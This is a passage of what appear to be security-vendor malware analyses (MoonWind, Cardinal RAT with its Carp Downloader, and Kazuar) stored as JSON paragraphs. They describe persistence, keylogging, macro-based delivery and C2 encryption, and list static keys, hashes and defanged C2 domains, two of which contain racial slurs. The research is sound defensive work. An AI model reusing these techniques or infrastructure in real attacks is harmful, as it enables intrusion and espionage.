        {
            "type": "paragraph",
            "content": [
                "During the install routine, the malware will also setup a timer that will execute a file named 'sevrsvos.exe'.",
                "This sample (815df680be80b26b5dff0bcaf73f7495b9cae5e3ad3acb7348be188af3e75201) acts as a runtime persistence mechanism.",
                "It installs itself as a service with the following properties:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Service Name: Windows Ejlptxtxbfjn Rvzd\nDisplay Name: Windows Ejlptxtxbfjn Rvzd\nDescription: Windows Ejlptxtxbfjn Rvzd Hlptxbfjnr\nStartup Type: Automatic"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This service serves the single purpose of checking every 60 seconds if the 'svcohos.exe' process is running.",
                "If not, the service will spawn a new instance of it.",
                "In doing so, this secondary malware sample acts as both a runtime persistence mechanism, as well as a persistence mechanism across reboots."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After installation, a keylogging routine begins.",
                "The malware writes keystrokes and window information to a filename in the present working directory with the following filename:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "jop[year][month][day][hour][minute][seconds].zip"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, it writes a 'win.ini' file that contains this file path above."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware proceeds to collect the following victim information:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After this information is aggregated, MoonWind enters its command and control loop, and begins reaching out to the servers and ports specified in its configuration embedded in the svcohos.exe file.",
                "The following remote hosts were specified in this particular sample:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "dns.webswindows[.]com|80\ndns.webswindows[.]com|443\ndns.webswindows[.]com|53\ndns.webswindows[.]com|8080"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While the ports associated with this samples configuration pertain normally to HTTP, HTTPS, or DNS, network communication takes place via raw sockets.",
                "The malware first receives data, which has the following format as shown in Figure 1:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 C2 to MoonWind communication"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Digging into the packet further, we can break out individual pieces, as seen in Figure 2:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 MoonWind network communication packet format"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The encrypted data portion is encrypted via RC4 with the following static key:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HHSADh!@#$YUAGEWYGhjfsjd5465fsaQWAFGDA/jfdafdjhhasgfh=="
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the above example, the encrypted data decrypts to \\x20\\x20\\x20\\x20\\x20\\x20, or six spaces.",
                "This particular command requests that the malware send the previously collected victim information."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The data returned by MoonWind has the same format, however, uses the following static key for encryption instead:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SSHqWSSAFdhjklfahj!@##4*&&!!HQ12785452!@!!$$$32#@$$11!!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "An example of such data returned by the malware can be seen below in figure 3."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 MoonWind to C2 communication"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When decrypted, we see the data shown in Figure 4. Note that the first six bytes contains the return command (WYR002), followed by the payload.",
                "The payload contains information previously discussed, delimited by */*. Certain variables, such as cdg and ip are hardcoded.",
                "We also see what is most likely a malware versioning string at the end (V2.1).",
                "This string is also hardcoded to the sample."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Decrypted data sent by MoonWind"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In total, MoonWind has 73 possibly commands that it can accept.",
                "We have not yet fully researched all of the commands, but the majority of them have been identified, as we can see in the Appendix."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Trochilus was first reported by Arbor Networks in their Seven Pointed Dagger report tying its use to other targeted Southeast Asia activity.",
                "The activity dates to at least 2013 and has ties to multiple reports by other researchers.",
                "It is highly likely MoonWind is yet another new tool being used by the group or groups responsible for that activity, indicating they are not only still active but continuing to evolve their playbook."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "AutoFocus subscribers can investigate the activities further with the following tags:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fd4856f2ec676f273ff71e1b0a1729cf6251c82780fc9e7d628deca690b02928\nce3da112e68e00621920911b1f9c72d7175894901173e703a44ac3700e4d427c\ne31679b82be58ace96b1d9fdfc2b62b6e91d371ed93957e0764cd7c464b04b9d\nf2589745671949422b19beec0856ca8b9608c02d5df4402f92c0dcc9d403010b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "815df680be80b26b5dff0bcaf73f7495b9cae5e3ad3acb7348be188af3e75201"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "59f8a31d66f053f1efcc8d7c7ebb209a8c12233423cc2dc3673373dde9b3a149"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "webswindows[.]com\n192.225.226[.]195"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ignite 17 Security Conference: Vancouver, BC June 1215, 2017"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ignite 17 Security Conference is a live, four-day conference designed for todays security professionals.",
                "Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry.",
                "Visit the Ignite website for more information on tracks, workshops and marquee sessions."
            ]
        }
    ],
    "f42850e30dce3415ef4981f5ff53775e70a283f8": [
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks has discovered a previously unknown remote access Trojan (RAT) that has been active for over two years.",
                "It has a very low volume in this two-year period, totaling roughly 27 total samples.",
                "The malware is delivered via an innovative and unique technique: a downloader we are calling Carp uses malicious macros in Microsoft Excel documents to compile embedded C# (C Sharp) Programming Language source code into an executable that in turn is run to deploy the Cardinal RAT malware family.",
                "These malicious Excel files use a number of different lures, providing evidence of what attackers are using to entice victims into executing them."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware from start to finish exhibits the following high level operations as shown in Figure 1:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Malware execution flow"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As previously mentioned, we have observed Cardinal RAT being delivered using a unique technique involving malicious Excel macros.",
                "We are calling these delivery documents the Carp Downloader, as they make use of a specific technique of compiling and executing embedded C# (CshARP) language source code that acts as a simple downloader."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We observed the following example macro in the most recent sample.",
                "Note that we have prefixed the function names with xx_ to make it easier for the reader to understand what is going on.",
                "Additionally, we have added comments to explain what is happening, as well as the un-obfuscated strings that are found within the macro."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Portion of malicious macro containing base64-encoded source code"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Portion of malicious macro responsible for compiling and executing embedded source code"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As a quick recap of what the malicious macro is doing, it begins by generating two pathsa path to a randomly named executable, and randomly named C# file in the %APPDATA%\\\\Microsoft folder.",
                "It then base64-decodes the embedded C# source code as shown in Figure 2 and writes it to the C# file path previously generated.",
                "Finally, as shown in Figure 3 it will compile and execute this C# source code using the Microsoft Windows built-in csc.exe utility."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoded source code in this example looks like the following as shown in Figure 4."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Decoded source code"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we can see, it simply downloads a file from secure.dropinbox[.]pw using HTTP on port 443 (not HTTPS), and proceeds to decrypt the file using AES-128 prior to executing it.",
                "At this point, Cardinal RAT has been downloaded and executed, and execution is directed to this sample.",
                "Of course, the Carp Downloader is not required to download Cardinal RAT, however, based on our visibility, it has exclusively done so."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A total of 11 unique Carp Downloader samples have been observed to date.",
                "The following figures show lures that we observed in these samples."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Lure with a filename of Top10Binary_Sample_HotLeads_13.9.xls"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Lure with a filename of AC_Media_Leads_ReportGenerator_5.2.xls"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 Lure with an unknown filename"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 Lure with a filename of Arabic 22.12_Pre qualified.xls"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9 Lure with an unknown filename"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 10 Lure with a filename of Hot_Leads_Export_09.03_EN.xls"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we can see from the above examples, the majority of these lures are financial-related, describing various fake customer lists for various organizations.",
                "Based on the similarities witnessed in some of these lures, it appears that the attackers use some sort of template, where they simply swap specific cells with the pertinent images or information."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The name Cardinal RAT comes from internal names used by the author within the observed Microsoft .NET Framework executables.",
                "To date, 27 unique samples of Cardinal RAT have been observed, dating back to December 2015.",
                "It is likely that the low volume of samples seen in the wild is partly responsible for the fact that this malware family has remained under the radar for so long."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "An unobfuscated copy of Cardinal RAT was identified, which allowed us to view the decompiled class and function names.",
                "A subset of these may be seen below in Figure 11.",
                "This allowed us to not only easily identify the full functionality of the RAT, but also made it easier to identify and reverse-engineer various aspects of the malware itself."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 11 Decompiled Cardinal RAT classes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When initially executed, the malware will check its current working directory.",
                "Should it not match the expected path, Cardinal will enter its installation routine.",
                "Cardinal RAT will copy itself to a randomly named executable in the specified directory.",
                "It will then compile and execute embedded source code that contains watchdog functionality.",
                "Specifically, this newly spawned executable will ensure that the following registry key is set:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This specific key is set to point towards the path of the previously copied Cardinal RAT executable path.",
                "The executable will periodically query this registry key to ensure it is set appropriately.",
                "If the executable finds the registry key has been deleted, it will re-set it.",
                "The Load registry key acts as a persistence mechanism, ensuring that this Cardinal RAT executes every time a user logs on.",
                "More information about the Load registry key may be found here."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This watchdog process also ensures that the Cardinal RAT process is always running, as well as ensures that the executable is located in the correct path.",
                "Should either of these conditions not be met, the watchdog process will spawn a new instance of Cardinal RAT, or write Cardinal RAT to the correct location, respectively."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the installation routine, Cardinal RAT will inject itself into a newly spawned process.",
                "It will attempt to use one of the following installed executables for the newly spawned process:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cardinal RAT will continue to parse an embedded configuration.",
                "This configuration, named internally as GreyCardinalConfig, is a binary blob that contains a mixture of base64-encoded data, DWORDs, and Boolean values.",
                "Using a custom written Python script, we parsed the configuration of an example sample:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we can see, this particular sample is configured with a single command and control (C2) server, however, we have seen other samples with multiple host and port combinations.",
                "We can also identify a communication key in it, which is crucial when discussing network communications."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the configuration is parsed, Cardinal RAT will proceed with making attempts at connecting with the C2.",
                "Using an example request and response from a C2 server, we can see how this traffic is configured."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 12 Parsed network traffic communication"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Data is transmitted in two piecesa DWORD specifying the data length, as well as the data itself.",
                "The data is encrypted using a series of XOR and addition operations, followed by decompression using the ZLIB library.",
                "Represented in Python, this may be implemented as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The md5_key argument in the function above is the MD5 hash of the previously defined H7sVBirLvGwVfLSLSeI2 string that was contained within Cardinal RATs embedded configuration.",
                "Now that we know how to decrypt the data, we can look at the previously shown PCAP data and determine what is being sent.",
                "The first message decrypts to the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Followed by the Cardinal RATs response:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This communication represents the C2 server asking the Cardinal RAT to retrieve and upload victim information (\\x00\\x00), to which the malware responds accordingly.",
                "As we can see in the above decrypted stream, the malware returns a wealth of information, including the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware itself is equipped with a number of features, including the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cardinal RAT is deployed using an interesting technique of compiling and executing a downloader via a malicious macro embedded within a Microsoft Excel file.",
                "The Excel files themselves contain lures that have financial themes.",
                "This threat has had a low volume of samples in the past two years, with 11 instances of Carp Downloader and 27 instances of Cardinal RAT observed.",
                "Palo Alto Networks customers are protected by these threats in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Carp Downloader SHA256 Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a52ba498d304906d6c060e8c56ad7db50e1af0a781616c0aa35447c50c28bae9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5025aa0fc6d4ac6daa2d9a6452263dcc20d6906149fc0995d458ed38e7e57b61"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1181f97071d8f96f9cdfb0f39b697204413cc0a715aa4935fe8964209289b331"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "84e705341a48c8c6552a7d3dd97b7cd968d2a9bc281a70c287df70813f5dca52"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ae1a6c4f917772100e3a5dc1fab7de4a277876a6e626da114baf8179b13b0031"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e49e61da52430011f1a22084a601cc08005865fe9a76abf503a4a9d2e11a5450"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "192b204dbc702d3762c953544975b61db8347a7739c6d8884bb4594bd816bf91"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "571b58ba655463705f45d2541f0fde049c83389a69552f98e41ece734a59f8d4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "10f53502922bf837900935892fb1da28fc712848471bf4afcdd08440d3bd037f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8bea55d2e35a2281ed71a59f1feb4c1cf6af1c053a94781c033a94d8e4c853e5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "057965e8b6638f0264d89872e80366b23255f1a0a30fd4efb7884c71b4104235"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cardinal RAT SHA256 Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e017651dd9e9419a7f1714f8f2cdc3d8e75aebbe6d3cfbb2de3f042f39aec3bd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "778090182a10fde1b4c1571d1e853e123f6ab1682e17dabe2e83468b518c01df"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8fababb509ad8230e4d6fa1e6403602a97e60dc8ef517016f86195143cf50f4e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1977cedcfb8726dea5e915b47e1479256674551bc0fe0b55ddd3fa3b15eb82b2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "16aab89d74c1eaaf1e94028c8ccceef442eb2cd5b052cba3562d2b1b1a3a4ba6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9c47b2af8b8c5f3c25f237dcc375b41835904f7cd99221c7489fb3563c34c9ab"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "211b7b7a4c4a07b9c65fae361570dbb94666e26f0cc0fa0b32df4b09fcee6de2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fd61a5cd1a83f68b75d47c8b6041f8640e47510925caee8176d5d81afac29134"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "84f822d9cf575aeea867e9b73f88ad4d9244293e52208644e12ff2cf13b6b537"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "855cf3a6422b0bf680d505720fd07c396508f67518670b493dba902c3c2e5dfa"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4b4c6b36938c3de0623feb92c0e1cb399d2dc338d2095b8ba84e862ef6d11772"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5dd162ab66f0c819ee73868c26ecd82408422e2b6366805631eab95ae32516f3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6e2991e02d3cf17d77173d50cdaa766661a89721c3cc4050fba98bea0dbdb1a9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1e8ed6e8d0b6fc47d8176c874ed40fb09644c058042f34d987878fa644f493cc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "647e379517fed71682423b0192da453ec1d61a633c154fdd55bab762bcc404f3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ebd4f45cbb272bcc4954cf1bd0a5b8802a6e501688f2a1abdb6143ba616aea82"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "edc49bf7ec508becb088d5082c78d360f1a7cad520f6de6d8b93759b67aac305"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7482f8c86b63ce53edcb62fc2ff2dd8e584e2164451ae0c6f2b1f4d6d0cb6d9c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2fbd3d2362acd1c8f0963b48d01f94c7a07aeac52d23415d0498c8c9e23554db"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "154e3a12404202fd25e29e754ff78703d4edd7da73cb4c283c9910fd526d47db"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fc5f7a21d953c394968647df6a37e1f61db04968ad1aca65ad8f261b363fa842"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a1d5b7d69d85b1be31d9e1cb0686094cc7b1213079b2a66ace01be4bfe3fb7c3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4b0203492a95257707a86992e84b5085ce9e11810a26920dbb085005081e32d3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a05805bcec72fb76b997c456e0fd6c4b219fdc51cad70d4a58c16b0b0e2d9ba1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4e953ea82b0406a5b95e31554628ad6821b1d91e9ada0d26179977f227cf01ad"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6272ed2a9b69509ac16162158729762d30f9ca06146a1828ae17afedd5c243ef"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "440504899b7af6f352cfaad6cdef1642c66927ecce0cf2f7e65d563a78be1b29"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domains"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1[.]squidmilk[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns2[.]squidmilk[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "z[.]realnigger[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1[.]tconvulsit[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1[.]fresweepy[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns2[.]iexogyrarax[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1[.]xraisermz[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "secure[.]affiliatetoday[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "secure[.]gayporndownload[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "secure[.]gameofthrone[.]club"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "secure[.]dropinbox[.]pw"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "secure[.]mailserver02[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "we[.]niggerporn[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "z[.]noplacelikehome[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1[.]stackreports[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns2[.]stackreports[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns[.]liveupdate1[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns[.]nortonsecurity[.]in"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "we[.]letsdosomefun[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "we[.]be-smart[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "z[.]newblood[.]xyz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns2[.]ibandagerk[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1[.]rmacutecompw[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1[.]pholothud[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1[.]athermoforw[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1[.]lclownerymor[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns2[.]xunderfeatuv[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns3[.]ssaddlegirv[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1[.]qcytasicspc[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns[.]7ni7[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ignite 17 Security Conference: Vancouver, BC June 1215, 2017"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ignite 17 Security Conference is a live, four-day conference designed for todays security professionals.",
                "Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry.",
                "Visit the Ignite website for more information on tracks, workshops and marquee sessions."
            ]
        }
    ],
    "29ca246b27b2c9b85c33d286c1c583e13275e3cb": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42 researchers have uncovered a backdoor Trojan used in an espionage campaign.",
                "The developers refer to this tool by the name Kazuar, which is a Trojan written using the Microsoft .NET Framework that offers actors complete access to compromised systems targeted by its operator.",
                "Kazuar includes a highly functional command set, which includes the ability to remotely load additional plugins to increase the Trojans capabilities.",
                "During our analysis of this malware we uncovered interesting code paths and other artifacts that may indicate a Mac or Unix variant of this same tool also exists.",
                "Also, we discovered a unique feature within Kazuar: it exposes its capabilities through an Application Programming Interface (API) to a built-in webserver."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We suspect the Kazuar tool may be linked to the Turla threat actor group (also known as Uroburos and Snake), who have been reported to have compromised embassies, defense contractors, educational institutions, and research organizations across the globe.",
                "A hallmark of Turla operations is iterations of their tools and code lineage in Kazuar can be traced back to at least 2005.",
                "If the hypothesis is correct and the Turla threat group is using Kazuar, we believe they may be using it as a replacement for Carbon and its derivatives.",
                "Of the myriad of tools observed in use by Turla Carbon and its variants were typically deployed as a second stage backdoor within targeted environments and we believe Kazuar may now hold a similar role for Turla operations."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Kazuar is a fully featured backdoor written using the .NET Framework and obfuscated using the open source packer called ConfuserEx.",
                "We used a combination of tools such as NoFuserEx, ConfuserEx Fixer, ConfuserEx Switch Killer, and de4d0t in order to deobfuscate the code for in depth analysis.",
                "We then used dnSpy to export the code to a Microsoft Visual Studio project, so that we could rename the random method names to better understand the flow of the code.",
                "We will describe how Kazuar works and what capabilities it offers threat actors."
            ]
        },
        {
            "type": "caption",
            "content": [
                "The malware initializes by gathering system and malware filename information and creates a mutex to make sure only one instance of the Trojan executes on the system at a time.",
                "Kazuar generates its mutex by using a process that begins with obtaining the MD5 hash of a string \u201c[username]=>singleton-instance-mutex\u201d.",
                "The Trojan then encrypts this MD5 hash using an XOR algorithm and the serial number of the storage volume.",
                "Kazuar uses the resulting ciphertext to generate a GUID that it appends to the string \u201cGlobal\\\\\u201d to create the mutex."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "An interesting artifact that we found within the mutex creation process is that if the code cannot obtain the systems storage serial number, it will use a static integer of 16456730 as a key to encrypt the MD5 hash.",
                "The hexadecimal representation of 16456730 is 0xFB1C1A, which appears to be included by the malware author as a potential reference to the United States FBI and CIA organizations."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan then creates a set of folders on the system to store various files created during its execution.",
                "Kazuar creates its folders using group names, which logically organize the files contained within the folder.",
                "Table 1 shows the folder layout:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Kazuar's folder group names and the files stored within"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan uses a similar process to create these folder and file names as it uses to generate its mutex, generating an MD5 hash of the name, using XOR on each byte using the volume serial number as a key and generating a GUID based on the ciphertext.",
                "The resulting GUIDs are used as file and folder names, which are combined with the local system path to the %LOCALAPPDATA% folder to create Kazuars folders."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Throughout its code, Kazuar verbosely logs its activities by writing debug messages to log files stored within the log folder.",
                "Kazuar encrypts the debug messages saved in these log files using the Rijndael cipher.",
                "We decrypted the initial entry that was added to the log files during the execution of the Trojan.",
                "This entry reveals the following information:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The log message above shows that the malware author refers to the Trojan as Kazuar.",
                "Interestingly, the word Kazuar appears in several languages, such as Polish, Hungarian and Slovenian, and is the ASCII form of the Russian word .",
                "The word Kazuar and  translates to Cassowary, which is a large flightless bird native to New Guinea and Australia as shown in Figure 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Cassowary (Source; Wikicommons)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After initial setup, the method at the main entry point of the malware, as seen in Figure 2 may follow one of four main paths of execution.",
                "The main entry point contains a relatively simple set of if statements that determine the execution path of the malware.",
                "Interestingly, one of the paths appears to be for execution on a Mac or Unix host."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2. Main entry point shows if statements that control the flow of execution"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The four possible paths of execution taken by Kazuars main entry point are as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The flow of execution is carefully guided by its operating environment, which is determined using the .NET Framework Environment.OSVersion.Platform.PlatformID",
                "enumeration, as seen in the function in Figure 3 that is responsible for gathering system specific information.",
                "Interestingly, we see a specific boolean variable for a PlatformID value of Unix that suggests that Kazuar might be used against Mac or Unix targets that return True for that API."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3.",
                "The getsysinfo() function provides various environment enumeration capabilities for Kazuar."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After enumerating the operating environment, Kazuar will attempt to establish persistent access to the system.",
                "Kazuar uses the method displayed in Figure 4 within its Autorun class to set up persistence on Windows systems, which has multiple options including:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4. Kazuar\u2019s Autorun class is a Windows specific method that contains multiple options for persistence using the startup folder and registry."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Kazuar Trojan initially relies on its command and control channel to allow actors to interact with the compromised system and to exfiltrate data.",
                "Kazuar has the capabilities to use multiple protocols, such as HTTP, HTTPS, FTP or FTPS, determined by the prefixes of the hardcoded C2 URLs.",
                "So far, we have only observed HTTP used as the C2 protocol in our sample set.",
                "All of the known Kazuar C2 servers appear to be compromised WordPress blogs, suggesting that the threat group using Kazuar in attacks also locates and exploits vulnerable WordPress sites as part of their playbook."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To interact with its C2 server, Kazuar begins its communication by creating an HTTP GET request to use as a beacon.",
                "The beacon, generated by the code seen in Figure 5 contains a cookie that has an AuthToken value that is a base64 encoded GUID used to uniquely identify the compromised system.",
                "Kazuar refers to this GUID as an agent identifier."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5.",
                "The createGET and getWebRequest classes define the construction of the HTTP request used for command and control communication."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During our analysis, we observed the beacon seen in Figure 6 sent via HTTP from a Kazuar sample to its C2 server.",
                "The initial HTTP beacon shows the base64 encoded AuthToken value within the Cookie field that we believe the C2 server uses to uniquely identify and track individual compromised hosts."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6.",
                "Wireshark snippet of a fully constructed HTTP GET request which shows the base64 encoded GUID within the Cookie header."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Kazuar will read the response from the C2 server and attempt to parse the response as XML formatted data.",
                "The XML formatted data will contain what Kazuar refers to as a task, which is comprised of an action identifier and specific arguments for each action.",
                "Figure 7 below shows the code responsible for receiving the response to the HTTP request and using a long integer stored in the num variable as the action identifier."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7.",
                "The response parser listens for new tasks to be received from the command and control server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The action identifier is directly related to the command which the actor wishes to run on the compromised system.",
                "Surprisingly, Kazuar also contains methods for each command to equate the action identifier to a string that describes the command, which makes determining the purpose of each command much easier.",
                "Table 2 shows a list of available commands within Kazuar, specifically each action identifier, command string and a description."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 Kazuar's command handler, including action identifier, command string and description"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As can be seen from the Table 2 above, Kazuar has an extensive command set, many of which are similar in functionality as other backdoor Trojans.",
                "However, a few commands specific to Kazuar appear to be unique and are worth further discussion."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "First, several of these commands contain checks to determine the environment in order to use appropriate paths or commands.",
                "The tasklist command will use a WMI query or the ps command, which allows Kazuar to obtain running processes from both Windows and Unix systems.",
